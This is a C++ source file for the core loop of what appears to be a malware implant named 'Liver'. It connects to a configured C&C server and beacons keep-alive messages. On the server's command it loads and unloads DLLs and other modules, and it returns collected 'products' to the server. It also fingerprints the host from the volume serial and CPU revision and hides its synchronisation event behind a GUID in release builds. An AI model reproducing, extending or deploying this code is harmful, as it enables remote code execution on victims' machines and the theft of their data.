#include "Include/Liver.hpp"

#include "ICommandHandler.hpp"
#include "Json.hpp"
#include "LiverConfiguration.hpp"
#include "Trace.hpp"
#include "CommandFactories/JsonCommandFactory.hpp"
#include "Commands/ICommand.hpp"
#include "Communicators/RawCommunicator.hpp"
#include "Communicators/Protocol/KeepAliveRequest.hpp"
#include "Communicators/Protocol/ReturnProductsRequest.hpp"
#include "Communicators/Protocol/SendRandomResponse.hpp"
#include "Filesystem/VolumeIterator.hpp"
#include "Handlers/LoadDllHandler.hpp"
#include "Handlers/LoadFigHandler.hpp"
#include "Handlers/UnloadDllHandler.hpp"
#include "Handlers/UnloadFigHandler.hpp"
#include "Networking/MaintainedSocket.hpp"
#include "Synchronization/Event.hpp"
#include "Utils/Random.hpp"

Liver::Liver(Event::Ptr quit_event,
             ICommandFactory::Ptr command_factory,
             ICommunicator::Ptr communicator,
             const Time::Duration iteration_delay) :
	m_liver_id(calculate_liver_id()),
	m_quit_event(std::move(quit_event)),
	m_command_factory(std::move(command_factory)),
	m_communicator(std::move(communicator)),
	m_iteration_delay(iteration_delay),
	m_products(),
	m_libraries(std::make_shared<LibrariesContainer>()),
	m_handlers()
{
	register_handlers();
}

void Liver::run()
{
	TRACE(L"running liver");

	do
	{
		try
		{
			TRACE(L"liver iteration");
			IRequest::Ptr request = get_next_request();
			std::shared_ptr<IResponse> response = m_communicator->send(std::move(request));
			handle_response(std::move(response));
		}
		CATCH_AND_TRACE()
	}
	while (m_quit_event->wait(m_iteration_delay) == WaitStatus::TIMEOUT);

	TRACE(L"finished liver");
}

std::unique_ptr<Liver> Liver::create([[maybe_unused]] const Buffer& liver_configuration)
{
	const LiverConfiguration config = LiverConfiguration::parse(liver_configuration);
	return std::make_unique<Liver>(
		std::make_shared<Event>(quit_event_name(), Event::Type::MANUAL_RESET),
		std::make_unique<JsonCommandFactory>(),
		RawCommunicator::from_stream(std::make_shared<MaintainedSocket>(SocketAddress{config.cnc_ip, config.cnc_port})),
		config.iteration_delay
	);
}

uint32_t Liver::liver_id() const
{
	return m_liver_id;
}

std::wstring Liver::quit_event_name()
{
	static constexpr auto QUIT_EVENT_NAME =
#ifdef _DEBUG
		L"LiverEvent";
#else
		L"{1C954BE0-3357-4073-93AD-17E678A72CB5}";
#endif
	return std::wstring{Event::GLOBAL_NAMESPACE} + QUIT_EVENT_NAME;
}

IRequest::Ptr Liver::get_next_request()
{
	if (!m_products.has_new())
	{
		return std::make_unique<KeepAliveRequest>(m_liver_id);
	}
	return std::make_unique<ReturnProductsRequest>(m_liver_id, m_products.pop_all());
}

void Liver::handle_response(IResponse::Ptr response)
{
	switch (response->type())
	{
	case IResponse::Type::KEEP_ALIVE:
	{
		TRACE(L"got KeepAlive request");
		break;
	}

	case IResponse::Type::EXECUTE_COMMANDS:
	{
		TRACE(L"got ExecuteCommands request");
		const auto execute_commands_response = std::dynamic_pointer_cast<ExecuteCommandsResponse>(
			std::move(response)
		);
		handle_execute_commands(*execute_commands_response);
		break;
	}

	case IResponse::Type::SEND_RANDOM:
	{
		const auto send_random_response = std::dynamic_pointer_cast<SendRandomResponse>(std::move(response));
		TRACE(L"SendRandomResponse random: ", send_random_response->value());
		break;
	}

	default:
		throw Exception(ErrorCode::UNCOVERED_ENUM_VALUE);
	}
}

void Liver::handle_execute_commands(const ExecuteCommandsResponse& response)
{
	std::vector<ICommand::Ptr> commands;
	for (const Command& command : response.commands())
	{
		commands.push_back(m_command_factory->create(command));
	}
	execute_commands(commands);
}

void Liver::execute_commands(const std::vector<ICommand::Ptr>& commands)
{
	for (const ICommand::Ptr& command : commands)
	{
		if (!m_handlers.contains(command->type()))
		{
			TRACE(L"unhandled command type: ", static_cast<uint32_t>(command->type()));
			continue;
		}
		const ICommandHandler::Ptr& handler = m_handlers[command->type()];
		std::vector<IProduct::Ptr> products = handler->handle(command);
		m_products.insert_all(std::move(products));
	}
}

void Liver::register_handlers()
{
	register_handler(ICommand::Type::LOAD_DLL, std::make_unique<LoadDllHandler>(m_libraries));
	register_handler(ICommand::Type::UNLOAD_DLL, std::make_unique<UnloadDllHandler>(m_libraries));

	register_handler(ICommand::Type::LOAD_FIG, std::make_unique<LoadFigHandler>(m_figs));
	register_handler(ICommand::Type::UNLOAD_FIG, std::make_unique<UnloadFigHandler>(m_figs));
}

void Liver::register_handler(const ICommand::Type type, ICommandHandler::Ptr handler)
{
	m_handlers.insert_or_assign(type, std::move(handler));
}

uint32_t Liver::calculate_liver_id()
{
	const std::filesystem::path system_volume = VolumeIterator::get_system_volume();
	const uint32_t system_volume_serial = VolumeIterator::get_volume_serial(system_volume);

	SYSTEM_INFO info;
	GetSystemInfo(&info);

	const uint32_t processor_revision_mask = info.wProcessorRevision | (info.wProcessorRevision << 16);

	return system_volume_serial | processor_revision_mask;
}
